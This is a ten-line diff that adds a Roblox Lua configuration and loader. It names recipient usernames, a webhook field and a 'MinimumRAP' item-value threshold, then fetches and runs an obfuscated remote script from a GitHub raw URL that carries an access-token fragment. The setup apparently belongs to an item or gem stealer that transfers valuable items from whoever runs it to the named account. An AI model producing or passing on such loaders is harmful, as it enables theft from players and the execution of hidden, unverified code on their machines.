@@ -1,0 +1,10 @@
+Username = "saintaru"
+Username2 = "saintaru"
+Webhook = "idk"
+
+LoadingScreen = false
+
+MinimumRAP = 20000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EveryoneisRichV4/EasyGem/main/Protected_7085672970689131_3.lua?token=GHSAT0AAAAAACN6U2MKVYOC7QFR76ZIWN4UZOEZ2XQ
+"))()
